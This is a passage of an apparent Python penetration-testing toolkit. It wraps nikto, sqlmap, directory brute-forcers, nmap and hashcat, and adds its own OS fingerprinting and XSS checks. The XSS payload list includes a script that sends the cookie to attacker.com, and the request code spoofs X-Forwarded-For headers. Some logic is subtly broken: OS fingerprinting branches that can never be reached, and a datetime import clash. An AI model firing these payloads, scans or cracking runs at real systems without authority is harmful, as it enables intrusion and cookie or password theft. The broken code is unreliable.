            print_error(f"OS detection error: {e}")

    elif method == 2:
        if scapy is None:
            print_error("Scapy is not installed, cannot perform TCP/IP fingerprinting")
            return

        with console.status(f"[bold {NordColors.FROST_2}]Analyzing TCP/IP behavior...[/]"):
            try:
                # TTL probe
                ttl_probe = scapy.sr1(scapy.IP(dst=target) / scapy.ICMP(), timeout=1, verbose=0)
                ttl = ttl_probe.ttl if ttl_probe else 0

                # Window size probe
                syn_probe = scapy.sr1(scapy.IP(dst=target) / scapy.TCP(dport=80, flags="S"), timeout=1, verbose=0)
                win_size = syn_probe.window if syn_probe and scapy.TCP in syn_probe else 0

                # Analyze results
                os_guess = "Unknown"
                confidence = "Low"

                if ttl >= 60 and ttl <= 64:
                    os_guess = "Linux/Unix/macOS"
                    confidence = "Medium"
                    if win_size == 65535:
                        os_guess = "Linux"
                        confidence = "High"
                    elif win_size == 65535 or win_size == 65549:
                        os_guess = "FreeBSD"
                        confidence = "High"
                    elif win_size == 65535 or win_size == 65640:
                        os_guess = "OpenBSD"
                        confidence = "High"
                    elif win_size >= 65535:
                        os_guess = "macOS"
                        confidence = "High"
                elif ttl >= 128 and ttl <= 132:
                    os_guess = "Windows"
                    confidence = "Medium"
                    if win_size == 8192:
                        os_guess = "Windows (older versions)"
                        confidence = "High"
                    elif win_size == 16384:
                        os_guess = "Windows (recent versions)"
                        confidence = "High"
                    elif win_size == 65535:
                        os_guess = "Windows 10/11"
                        confidence = "High"
            except Exception:
                os_guess = "Unknown"
                confidence = "None"
                ttl = 0
                win_size = 0

        display_panel(
            "TCP/IP Fingerprinting Results",
            f"Target: {target}\nOS: {os_guess}\nConfidence: {confidence}\nTTL: {ttl}\nWindow Size: {win_size}",
            NordColors.GREEN if confidence == "High" else NordColors.YELLOW
        )

        if get_confirmation("Save these results to file?"):
            scan_result = ScanResult(
                target=target,
                os_info={"os": os_guess, "confidence": confidence, "ttl": ttl, "window_size": win_size}
            )
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"os_fingerprint_{target.replace('.', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, filename)


def web_vulnerability_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Web Vulnerability Scanning",
        "Scan for vulnerabilities in web applications.",
        NordColors.FROST_2
    )

    options = [
        ("1", "Nikto Scan", "Web server vulnerability scanner"),
        ("2", "SQLMap Scan", "SQL injection vulnerability scanner"),
        ("3", "Directory Bruteforce", "Discover hidden directories and files"),
        ("4", "Basic XSS Check", "Simple cross-site scripting checks"),
        ("5", "SSL/TLS Analysis", "Check for SSL/TLS vulnerabilities"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Web Vulnerability Options", options))

    choice = get_integer_input("Select an option", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        run_nikto_scan()
    elif choice == 2:
        run_sqlmap_scan()
    elif choice == 3:
        directory_bruteforce()
    elif choice == 4:
        xss_check()
    elif choice == 5:
        ssl_tls_check()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def run_nikto_scan():
    if shutil.which("nikto") is None:
        display_panel(
            "Tool Missing",
            "Nikto is not installed. Please install it using:\nbrew install nikto",
            NordColors.RED
        )
        return

    target = get_user_input("Enter target URL (e.g., http://example.com)")
    if not target:
        return

    options = get_user_input("Enter additional nikto options or leave blank for default")

    cmd = ["nikto", "-h", target]
    if options:
        cmd.extend(options.split())

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running Nikto scan on {target}...[/]"):
            result = run_command(cmd, capture_output=True, timeout=900)  # 15 minute timeout

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            vulnerabilities = []
            for line in result.stdout.splitlines():
                if "+ " in line and ":" in line:
                    vuln_id = line.split(": ")[0].strip().replace("+ ", "")
                    desc = ": ".join(line.split(": ")[1:]).strip()
                    vulnerabilities.append({"id": vuln_id, "description": desc})

            display_panel(
                "Nikto Scan Results",
                f"Found {len(vulnerabilities)} potential vulnerabilities on {target}",
                NordColors.FROST_2
            )

            if vulnerabilities:
                table = Table(
                    title="Vulnerabilities Summary",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                table.add_column("ID", style=f"bold {NordColors.FROST_2}")
                table.add_column("Description", style=NordColors.SNOW_STORM_1)

                for vuln in vulnerabilities[:20]:  # Show only top 20
                    table.add_row(vuln["id"], vuln["description"])

                if len(vulnerabilities) > 20:
                    footnote = f"\n[bold {NordColors.YELLOW}]Showing 20 of {len(vulnerabilities)} vulnerabilities. See full report in {output_path}[/]"
                    console.print(table)
                    console.print(footnote)
                else:
                    console.print(table)

            print_success(f"Full results saved to: {output_path}")

            # Save structured data
            scan_result = ScanResult(
                target=target,
                vulnerabilities=vulnerabilities
            )
            json_filename = f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, json_filename)
        else:
            display_panel("Scan Complete", "No output from Nikto scan", NordColors.YELLOW)
    except Exception as e:
        print_error(f"Nikto scan error: {e}")


def run_sqlmap_scan():
    if shutil.which("sqlmap") is None:
        display_panel(
            "Tool Missing",
            "SQLMap is not installed. Please install it using:\nbrew install sqlmap",
            NordColors.RED
        )
        return

    target = get_user_input("Enter target URL (e.g., http://example.com/page.php?id=1)")
    if not target:
        return

    scan_level = get_integer_input("Enter scan level (1-5, higher is more thorough)", 1, 5)
    if scan_level < 1:
        scan_level = 1

    data = get_user_input("Enter POST data if applicable (leave blank for GET requests)")
    cookie = get_user_input("Enter cookies if needed (format: name1=value1; name2=value2)")

    cmd = ["sqlmap", "-u", target, "--batch", f"--level={scan_level}"]

    if data:
        cmd.extend(["--data", data])
    if cookie:
        cmd.extend(["--cookie", cookie])

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running SQLMap scan on {target}...[/]"):
            result = run_command(cmd, capture_output=True, timeout=1800)  # 30 minute timeout

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"sqlmap_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            vulnerabilities = []
            is_vulnerable = False
            for line in result.stdout.splitlines():
                if "is vulnerable" in line.lower():
                    is_vulnerable = True
                    vulnerabilities.append({"type": "SQL Injection", "description": line.strip()})
                elif "parameter " in line.lower() and " is " in line.lower() and "vulnerable" in line.lower():
                    is_vulnerable = True
                    vulnerabilities.append({"type": "SQL Injection", "description": line.strip()})

            if is_vulnerable:
                display_panel(
                    "SQLMap Scan Results",
                    f"Target is VULNERABLE to SQL Injection: {target}",
                    NordColors.RED
                )

                table = Table(
                    title="SQL Injection Vulnerabilities",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                table.add_column("Type", style=f"bold {NordColors.FROST_2}")
                table.add_column("Description", style=NordColors.SNOW_STORM_1)

                for vuln in vulnerabilities:
                    table.add_row(vuln["type"], vuln["description"])

                console.print(table)
            else:
                display_panel(
                    "SQLMap Scan Results",
                    f"No SQL Injection vulnerabilities found on {target}",
                    NordColors.GREEN
                )

            print_success(f"Full results saved to: {output_path}")

            # Save structured data
            scan_result = ScanResult(
                target=target,
                vulnerabilities=vulnerabilities
            )
            json_filename = f"sqlmap_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, json_filename)
        else:
            display_panel("Scan Complete", "No output from SQLMap scan", NordColors.YELLOW)
    except Exception as e:
        print_error(f"SQLMap scan error: {e}")


def directory_bruteforce():
    tools = ["gobuster", "ffuf", "dirb"]
    available_tools = []

    for tool in tools:
        if shutil.which(tool):
            available_tools.append(tool)

    if not available_tools:
        display_panel(
            "Tool Missing",
            "No directory bruteforce tools installed. Please install one of the following:\nbrew install gobuster ffuf dirb",
            NordColors.RED
        )
        return

    tool_choice = 0
    if len(available_tools) > 1:
        console.print(f"[bold {NordColors.FROST_2}]Available tools:[/]")
        for i, tool in enumerate(available_tools, 1):
            console.print(f"  {i}. {tool}")
        tool_choice = get_integer_input(f"Select tool (1-{len(available_tools)})", 1, len(available_tools)) - 1
        if tool_choice < 0:
            tool_choice = 0

    selected_tool = available_tools[tool_choice]

    target = get_user_input("Enter target URL (e.g., http://example.com)")
    if not target:
        return

    wordlist_options = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        f"{WORDLISTS_DIR}/web_dirs.txt",
        "custom"
    ]

    default_wordlist = next((w for w in wordlist_options if os.path.exists(os.path.expanduser(w))), wordlist_options[0])

    console.print(f"[bold {NordColors.FROST_2}]Wordlist options:[/]")
    for i, wl in enumerate(wordlist_options, 1):
        console.print(f"  {i}. {wl}")

    wordlist_choice = get_integer_input(f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options))
    if wordlist_choice <= 0:
        return

    if wordlist_options[wordlist_choice - 1] == "custom":
        wordlist = get_user_input("Enter path to custom wordlist")
    else:
        wordlist = wordlist_options[wordlist_choice - 1]

    if not os.path.exists(os.path.expanduser(wordlist)):
        wordlist_dir = WORDLISTS_DIR / "web_dirs.txt"
        print_warning(f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}")

        basic_dirs = [
            "admin", "login", "wp-admin", "wp-content", "images", "img", "css", "js",
            "upload", "uploads", "backup", "backups", "config", "dashboard", "api",
            "php", "include", "includes", "src", "test", "tests", "tmp", "temp",
            "admin", "administrator", "login", "wp-login.php", "cpanel", "phpmyadmin"
        ]

        with open(wordlist_dir, "w") as f:
            for d in basic_dirs:
                f.write(f"{d}\n")

        wordlist = str(wordlist_dir)

    extensions = get_user_input("Enter file extensions to look for (e.g., php,html,txt) or leave blank")

    if selected_tool == "gobuster":
        cmd = ["gobuster", "dir", "-u", target, "-w", wordlist, "-q"]
        if extensions:
            cmd.extend(["-x", extensions])
    elif selected_tool == "ffuf":
        cmd = ["ffuf", "-u", f"{target}/FUZZ", "-w", f"{wordlist}:FUZZ", "-s"]
        if extensions:
            ext_list = extensions.split(",")
            ext_wordlist = WORDLISTS_DIR / "temp_extensions.txt"
            with open(ext_wordlist, "w") as f:
                for ext in ext_list:
                    f.write(f"{ext.strip()}\n")
            cmd.extend(["-e", ".backup,.bak,.swp,.old"])
    else:  # dirb
        cmd = ["dirb", target, wordlist, "-S"]
        if extensions:
            cmd.extend(["-X", extensions.replace(",", ",")])

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Bruteforcing directories on {target}...[/]"):
            result = run_command(cmd, capture_output=True, timeout=1800)  # 30 minute timeout

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"dirbrute_{selected_tool}_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            found_dirs = []

            for line in result.stdout.splitlines():
                if selected_tool == "gobuster":
                    if "Status: 200" in line or "Status: 301" in line or "Status: 302" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            found_dirs.append({"path": parts[0], "status": parts[1].replace("Status:", "")})
                elif selected_tool == "ffuf":
                    if "Status:" in line and not line.startswith("["):
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part == "Status:":
                                status = parts[i + 1]
                                path = parts[-1]
                                found_dirs.append({"path": path, "status": status})
                                break
                else:  # dirb
                    if "CODE:200" in line or "CODE:301" in line or "CODE:302" in line:
                        parts = line.split()
                        path = next((p for p in parts if target in p), "")
                        status = line.split("CODE:")[1].split()[0] if "CODE:" in line else ""
                        if path:
                            found_dirs.append({"path": path, "status": status})

            display_panel(
                f"{selected_tool.capitalize()} Scan Results",
                f"Found {len(found_dirs)} directories/files on {target}",
                NordColors.GREEN if found_dirs else NordColors.YELLOW
            )

            if found_dirs:
                table = Table(
                    title="Discovered Paths",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                table.add_column("Path", style=f"bold {NordColors.FROST_2}")
                table.add_column("Status", style=NordColors.SNOW_STORM_1)

                for entry in found_dirs[:30]:  # Show only first 30
                    table.add_row(entry["path"], entry["status"])

                if len(found_dirs) > 30:
                    footnote = f"\n[bold {NordColors.YELLOW}]Showing 30 of {len(found_dirs)} results. See full report in {output_path}[/]"
                    console.print(table)
                    console.print(footnote)
                else:
                    console.print(table)

            print_success(f"Full results saved to: {output_path}")
        else:
            display_panel("Scan Complete", f"No output from {selected_tool} scan", NordColors.YELLOW)
    except Exception as e:
        print_error(f"Directory bruteforce error: {e}")


def xss_check():
    target = get_user_input("Enter target URL with parameter (e.g., http://example.com/page.php?param=test)")
    if not target:
        return

    if "=" not in target:
        print_error("URL must contain at least one parameter")
        return

    # Parse URL and parameters
    parts = target.split("?", 1)
    if len(parts) != 2:
        print_error("Invalid URL format")
        return

    base_url = parts[0]
    params_str = parts[1]
    param_pairs = params_str.split("&")
    params = {}

    for pair in param_pairs:
        if "=" in pair:
            key, value = pair.split("=", 1)
            params[key] = value

    if not params:
        print_error("No valid parameters found in URL")
        return

    # XSS payloads to test
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
    ]

    results = []

    progress, task = display_progress(len(params) * len(xss_payloads), "Testing XSS payloads", NordColors.FROST_2)

    with progress:
        for param_name in params:
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload

                # Construct test URL
                test_url = base_url + "?"
                test_url += "&".join([f"{k}={v}" for k, v in test_params.items()])

                try:
                    headers = {
                        "User-Agent": random.choice(USER_AGENTS),
                        "X-Forwarded-For": f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    }

                    response = requests.get(test_url, headers=headers, timeout=10)

                    # Check if payload is reflected in the response
                    if payload in response.text:
                        results.append({
                            "param": param_name,
                            "payload": payload,
                            "reflected": True,
                            "status_code": response.status_code
                        })
                except Exception as e:
                    print_error(f"Error testing {param_name} with payload {payload}: {e}")
                finally:
                    progress.update(task, advance=1)

    if results:
        display_panel(
            "XSS Test Results",
            f"Found {len(results)} potential XSS vulnerabilities",
            NordColors.YELLOW
        )

        table = Table(
            title="Potential XSS Vulnerabilities",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Parameter", style=f"bold {NordColors.FROST_2}")
        table.add_column("Payload", style=NordColors.FROST_3)
        table.add_column("Status", style=NordColors.SNOW_STORM_1)

        for result in results:
            table.add_row(
                result["param"],
                result["payload"],
                f"Reflected (Status: {result['status_code']})"
            )

        console.print(table)
        console.print(
            f"\n[bold {NordColors.RED}]WARNING:[/] This is a basic check only. Manual verification is required.")

        if get_confirmation("Save these results to file?"):
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_check_{parts[0].replace('://', '_').replace('/', '_')}_{timestamp}.json"
            save_result_to_file(
                {"target": target, "results": results, "timestamp": datetime.datetime.now().isoformat()},
                filename
            )
    else:
        display_panel(
            "XSS Test Results",
            "No obvious XSS vulnerabilities found. This doesn't guarantee safety - manual testing is recommended.",
            NordColors.GREEN
        )


def ssl_tls_check():
    target = get_user_input("Enter target hostname (e.g., example.com)")
    if not target:
        return

    # Remove protocol if specified
    if "://" in target:
        target = target.split("://")[1]

    # Remove path if specified
    if "/" in target:
        target = target.split("/")[0]

    port = get_integer_input("Enter port (default: 443)", 1, 65535)
    if port <= 0:
        port = 443

    if shutil.which("nmap") is None:
        print_warning("Nmap not found, using basic SSL check")
        basic_ssl_check(target, port)
    else:
        nmap_ssl_check(target, port)


def basic_ssl_check(target, port):
    console.print(f"[bold {NordColors.FROST_2}]Checking SSL/TLS configuration for {target}:{port}...[/]")

    try:
        # Try to establish a secure connection
        import ssl
        import socket

        context = ssl.create_default_context()
        with socket.create_connection((target, port)) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()

                # Check certificate info
                not_after = cert.get('notAfter', 'Unknown')
                not_before = cert.get('notBefore', 'Unknown')
                issuer = dict(x[0] for x in cert.get('issuer', []))
                subject = dict(x[0] for x in cert.get('subject', []))

                # Print certificate details
                display_panel(
                    "SSL/TLS Certificate Information",
                    f"Server: {target}:{port}\n"
                    f"Issuer: {issuer.get('organizationName', 'Unknown')}\n"
                    f"Subject: {subject.get('commonName', 'Unknown')}\n"
                    f"Valid from: {not_before}\n"
                    f"Valid until: {not_after}\n"
                    f"Protocol: {ssock.version()}\n"
                    f"Cipher: {ssock.cipher()[0]}",
                    NordColors.GREEN
                )

                # Check if certificate is expired
                try:
                    from datetime import datetime
                    import time
                    expires = ssl.cert_time_to_seconds(not_after)
                    remaining = expires - time.time()
                    days_remaining = remaining / (24 * 60 * 60)

                    if days_remaining < 0:
                        print_error(f"Certificate EXPIRED {abs(int(days_remaining))} days ago")
                    elif days_remaining < 30:
                        print_warning(f"Certificate expires in {int(days_remaining)} days")
                    else:
                        print_success(f"Certificate valid for {int(days_remaining)} days")
                except Exception:
                    print_warning("Could not determine certificate expiration")

                if get_confirmation("Save these results to file?"):
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"ssl_check_{target}_{port}_{timestamp}.json"
                    save_result_to_file(
                        {
                            "target": f"{target}:{port}",
                            "issuer": issuer,
                            "subject": subject,
                            "valid_from": not_before,
                            "valid_until": not_after,
                            "protocol": ssock.version(),
                            "cipher": ssock.cipher()[0],
                            "timestamp": datetime.datetime.now().isoformat()
                        },
                        filename
                    )
    except ssl.SSLError as e:
        print_error(f"SSL Error: {e}")
    except socket.error as e:
        print_error(f"Connection Error: {e}")
    except Exception as e:
        print_error(f"Error: {e}")


def nmap_ssl_check(target, port):
    cmd = ["nmap", "--script", "ssl-enum-ciphers,ssl-cert", "-p", str(port), target]

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Scanning SSL/TLS on {target}:{port}...[/]"):
            result = run_command(cmd, capture_output=True, timeout=300)

        if result.stdout:
            # Parse the output
            certificate_info = {}
            cipher_info = {}
            vulnerabilities = []

            current_section = None

            for line in result.stdout.splitlines():
                # Certificate info parsing
                if "Subject:" in line:
                    certificate_info["subject"] = line.split("Subject:")[1].strip()
                elif "Issuer:" in line:
                    certificate_info["issuer"] = line.split("Issuer:")[1].strip()
                elif "Public Key type:" in line:
                    certificate_info["key_type"] = line.split("Public Key type:")[1].strip()
                elif "Public Key bits:" in line:
                    certificate_info["key_bits"] = line.split("Public Key bits:")[1].strip()
                elif "Not valid before:" in line:
                    certificate_info["not_before"] = line.split("Not valid before:")[1].strip()
                elif "Not valid after:" in line:
                    certificate_info["not_after"] = line.split("Not valid after:")[1].strip()

                # TLS version sections
                if "TLSv1.0" in line:
                    current_section = "TLSv1.0"
                    cipher_info[current_section] = []
                elif "TLSv1.1" in line:
                    current_section = "TLSv1.1"
                    cipher_info[current_section] = []
                elif "TLSv1.2" in line:
                    current_section = "TLSv1.2"
                    cipher_info[current_section] = []
                elif "TLSv1.3" in line:
                    current_section = "TLSv1.3"
                    cipher_info[current_section] = []

                # Cipher parsing
                if current_section and "ciphers:" in line:
                    continue
                elif current_section and "compressors:" in line:
                    current_section = None
                elif current_section and line.strip().startswith("TLS_"):
                    cipher_info[current_section].append(line.strip())

                # Vulnerabilities
                if "Weak cipher:" in line or "vulnerable" in line.lower():
                    vulnerabilities.append(line.strip())

            # Display the results
            display_panel(
                "SSL/TLS Scan Results",
                f"Target: {target}:{port}",
                NordColors.FROST_2
            )

            # Certificate info
            if certificate_info:
                cert_table = Table(
                    title="Certificate Information",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                cert_table.add_column("Property", style=f"bold {NordColors.FROST_2}")
                cert_table.add_column("Value", style=NordColors.SNOW_STORM_1)

                for key, value in certificate_info.items():
                    cert_table.add_row(key.replace("_", " ").title(), value)

                console.print(cert_table)

            # Cipher info
            for tls_version, ciphers in cipher_info.items():
                if ciphers:
                    cipher_table = Table(
                        title=f"{tls_version} Ciphers",
                        show_header=True,
                        header_style=f"bold {NordColors.FROST_1}",
                    )
                    cipher_table.add_column("Cipher", style=NordColors.SNOW_STORM_1)

                    for cipher in ciphers:
                        cipher_table.add_row(cipher)

                    console.print(cipher_table)

            # Vulnerabilities
            if vulnerabilities:
                vuln_table = Table(
                    title="Vulnerabilities",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                vuln_table.add_column("Issue", style=f"bold {NordColors.RED}")

                for vuln in vulnerabilities:
                    vuln_table.add_row(vuln)

                console.print(vuln_table)

            if get_confirmation("Save these results to file?"):
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"ssl_scan_{target}_{port}_{timestamp}.json"
                save_result_to_file(
                    {
                        "target": f"{target}:{port}",
                        "certificate": certificate_info,
                        "ciphers": cipher_info,
                        "vulnerabilities": vulnerabilities,
                        "timestamp": datetime.datetime.now().isoformat()
                    },
                    filename
                )

                # Also save raw output
                raw_filename = f"ssl_scan_raw_{target}_{port}_{timestamp}.txt"
                with open(RESULTS_DIR / raw_filename, "w") as f:
                    f.write(result.stdout)
                print_success(f"Raw scan output saved to: {RESULTS_DIR / raw_filename}")
        else:
            display_panel("Scan Complete", "No SSL/TLS information found", NordColors.YELLOW)
    except Exception as e:
        print_error(f"SSL/TLS scan error: {e}")


def password_tools_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Password Tools",
        "Password generation, hashing, and cracking tools.",
        NordColors.FROST_3
    )

    options = [
        ("1", "Generate Password", "Create secure random passwords"),
        ("2", "Hash Password", "Generate hashes from passwords"),
        ("3", "Crack Hash (Hashcat)", "Attempt to crack password hashes"),
        ("4", "Dictionary Generator", "Create custom wordlists"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Password Tools Options", options))

    choice = get_integer_input("Select an option", 0, 4)
    if choice == 0:
        return
    elif choice == 1:
        generate_password()
    elif choice == 2:
        hash_password()
    elif choice == 3:
        crack_hash()
    elif choice == 4:
        dictionary_generator()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_password():
    length = get_integer_input("Enter password length", 8, 128)
    if length <= 0:
        return

    complexity = get_integer_input("Select complexity level (1-3)", 1, 3)
    if complexity <= 0:
        return

    count = get_integer_input("How many passwords to generate?", 1, 100)
    if count <= 0:
        return

    passwords = []

    lowercase = "abcdefghijklmnopqrstuvwxyz"
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "0123456789"
    special = "!@#$%^&*()-_=+[]{}|;:,.<>?/"

    for _ in range(count):
        charset = lowercase

        if complexity >= 2:
            charset += uppercase + digits

        if complexity >= 3:
            charset += special

        # Ensure at least one character from each required charset
        password = []
        if complexity >= 2:
            password.append(random.choice(lowercase))
            password.append(random.choice(uppercase))
            password.append(random.choice(digits))

        if complexity >= 3:
            password.append(random.choice(special))

        # Fill the rest with random characters
        remaining_length = length - len(password)
        password.extend(random.choice(charset) for _ in range(remaining_length))

        # Shuffle the password
        random.shuffle(password)
        passwords.append(''.join(password))

    console.print()
    table = Table(
        title="Generated Passwords",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Password", style=NordColors.SNOW_STORM_1)
    table.add_column("Length", style=NordColors.FROST_3)

    for i, password in enumerate(passwords, 1):
        table.add_row(str(i), password, str(len(password)))

    console.print(table)

    if get_confirmation("Save passwords to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"passwords_{timestamp}.txt"
        filepath = PAYLOADS_DIR / filename

        with open(filepath, "w") as f:
            for password in passwords:
                f.write(f"{password}\n")

        print_success(f"Passwords saved to {filepath}")


def hash_password():
    import hashlib

    password = get_user_input("Enter the password to hash", password=True)
    if not password:
        return

    salt = get_user_input("Enter salt (optional)")

    hash_types = [
        "md5", "sha1", "sha224", "sha256", "sha384", "sha512",
        "sha3_224", "sha3_256", "sha3_384", "sha3_512"
    ]

    console.print(f"[bold {NordColors.FROST_2}]Available hash types:[/]")
    for i, hash_type in enumerate(hash_types, 1):
        console.print(f"  {i}. {hash_type}")

    hash_choice = get_integer_input(f"Select hash type (1-{len(hash_types)})", 1, len(hash_types))
    if hash_choice <= 0:
        return

    selected_hash = hash_types[hash_choice - 1]

    # Generate hash
    if salt:
        password_bytes = (password + salt).encode()
    else:
        password_bytes = password.encode()

    hash_obj = getattr(hashlib, selected_hash)(password_bytes)
    hash_hex = hash_obj.hexdigest()

    console.print()
    table = Table(
        title="Password Hash",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)

    table.add_row("Algorithm", selected_hash)
    table.add_row("Salt", salt if salt else "None")
    table.add_row("Hash", hash_hex)

    console.print(table)

    if get_confirmation("Save hash to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"hash_{selected_hash}_{timestamp}.txt"
        filepath = RESULTS_DIR / filename

        with open(filepath, "w") as f:
            f.write(f"Algorithm: {selected_hash}\n")
            f.write(f"Salt: {salt if salt else 'None'}\n")
            f.write(f"Hash: {hash_hex}\n")

        print_success(f"Hash saved to {filepath}")


def crack_hash():
    if shutil.which("hashcat") is None:
        display_panel(
            "Tool Missing",
            "Hashcat is not installed. Please install it using:\nbrew install hashcat",
            NordColors.RED
        )
        return

    hash_input = get_user_input("Enter the hash to crack")
    if not hash_input:
        return

    # Hash type selection
    hash_types = [
        {"id": 0, "name": "MD5", "example": "5f4dcc3b5aa765d61d8327deb882cf99"},
        {"id": 100, "name": "SHA1", "example": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8"},
        {"id": 1400, "name": "SHA2-256", "example": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"},
        {"id": 1700, "name": "SHA2-512",
         "example": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"}
    ]

    console.print(f"[bold {NordColors.FROST_2}]Select hash type:[/]")
    for i, hash_type in enumerate(hash_types, 1):
        console.print(f"  {i}. {hash_type['name']} (example: {hash_type['example'][:20]}...)")

    hash_choice = get_integer_input(f"Select hash type (1-{len(hash_types)})", 1, len(hash_types))
    if hash_choice <= 0:
        return

    selected_hash_type = hash_types[hash_choice - 1]

    # Attack mode selection
    attack_modes = [
        {"id": 0, "name": "Dictionary Attack", "description": "Try passwords from a wordlist"},
        {"id": 3, "name": "Brute Force", "description": "Try all possible combinations (limited)"}
    ]

    console.print(f"[bold {NordColors.FROST_2}]Select attack mode:[/]")
    for i, mode in enumerate(attack_modes, 1):
        console.print(f"  {i}. {mode['name']} - {mode['description']}")

    mode_choice = get_integer_input(f"Select attack mode (1-{len(attack_modes)})", 1, len(attack_modes))
    if mode_choice <= 0:
        return

    selected_mode = attack_modes[mode_choice - 1]

    # Save hash to file
    hash_file = RESULTS_DIR / "hash_to_crack.txt"
    with open(hash_file, "w") as f:
        f.write(hash_input)

    cmd = [
        "hashcat",
        "-m", str(selected_hash_type["id"]),
        "-a", str(selected_mode["id"]),
        "--status",
        "--force",
        hash_file
    ]

    if selected_mode["id"] == 0:  # Dictionary attack
        # Wordlist selection
        wordlist_options = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/local/share/wordlists/passwords.txt",
            f"{WORDLISTS_DIR}/passwords.txt",
            "custom"
        ]

        default_wordlist = next((w for w in wordlist_options if os.path.exists(os.path.expanduser(w))),
                                wordlist_options[0])

        console.print(f"[bold {NordColors.FROST_2}]Wordlist options:[/]")
        for i, wl in enumerate(wordlist_options, 1):
            console.print(f"  {i}. {wl}")

        wordlist_choice = get_integer_input(f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options))
        if wordlist_choice <= 0:
            return

        if wordlist_options[wordlist_choice - 1] == "custom":
            wordlist = get_user_input("Enter path to custom wordlist")
        else:
            wordlist = wordlist_options[wordlist_choice - 1]

        if not os.path.exists(os.path.expanduser(wordlist)):
            wordlist_dir = WORDLISTS_DIR / "passwords.txt"
            print_warning(f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}")

            basic_passwords = [
                "password", "123456", "12345678", "qwerty", "admin", "welcome",
                "password123", "123456789", "1234567890", "abc123", "letmein",
                "monkey", "admin123", "iloveyou", "1234", "1qaz2wsx", "dragon"
            ]

            with open(wordlist_dir, "w") as f:
                for pwd in basic_passwords:
                    f.write(f"{pwd}\n")

            wordlist = str(wordlist_dir)

        cmd.append(wordlist)
    else:  # Brute force
        charset = get_user_input("Enter character set (e.g., ?a for all, ?l for lowercase, ?d for digits)")
        if not charset:
            charset = "?a"

        min_len = get_integer_input("Minimum password length", 1, 10)
        max_len = get_integer_input("Maximum password length", min_len, 10)

        if min_len <= 0 or max_len <= 0:
            return

        mask = charset * min_len
        cmd.append(mask)

        if min_len != max_len:
            print_warning(f"Hashcat will try lengths from {min_len} to {max_len} in separate runs")

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running hashcat to crack hash...[/]"):
            result = run_command(cmd, capture_output=True, timeout=300, check=False)

        # Check if cracked
        cracked = False
        password = None

        if result.stdout:
            for line in result.stdout.splitlines():
                if "Status.........: Cracked" in line:
